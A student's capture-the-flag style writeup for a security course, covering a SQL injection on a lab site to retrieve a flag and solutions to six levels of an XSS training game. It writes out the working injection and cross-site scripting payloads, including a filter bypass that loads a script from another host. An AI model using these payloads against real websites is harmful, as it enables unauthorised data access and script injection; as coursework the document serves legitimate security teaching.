Writeup 10 - Crypto II
=====

Name: yared
Section: 0201

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement of honor pledge: ytsehaye	

## Assignment 10 Writeup

### Part 1 (70 Pts)
	The first part was a simple sql injection attack on the website. i got a clue that it was SQL related when i saw the Such a Quick Little website on the assignment prompt.
	when going through all the different items i noticed that there was an "/item?id=" at the end. so i tried different values to get all the values from the table. 

	I was finally able to get the flag by using

	http://cornerstoneairlines.co:8080/item?id=0' OR '0'='0

	i was able to get CMSC38R-{y0U-are_the_5ql_n1nja}.

### Part 2 (30 Pts)
	
	level 1=> 
		
		i just put in an alert script in the input box and was able to get the an alert. 

		<script>alert()</script>


	level 2
		
		i did the same thing here except i just used a script on the text box. i had to use hints here. 
		i gave a script of an image that was bad and added an attribute that made it alert on error
		<img src="err" onerror=alert()>

	level 3
		I had to make an alert from the url box instead.
		https://xss-game.appspot.com/level3/frame#1'onerror="alert()"

	level 4

		https://xss-game.appspot.com/level4/frame?timer=10');alert('

	level 5
		
		i went to the signup page and appended a javascript alert script and deleted next = confirm. after that i just put in an email and pressed next, which generated an alert. 

		https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()

	level 6
		I had to use all the hints on this one but i was able mimick hosting a js file using /google.com/jsapi?callback=foo. After some online searching i was able to see that i can change foo to alert and create an alert. link

		https://xss-game.appspot.com/level6/frame#//google.com/jsapi?callback=alert

		This wasnt working because it was filtering out http. So i just used double slash.


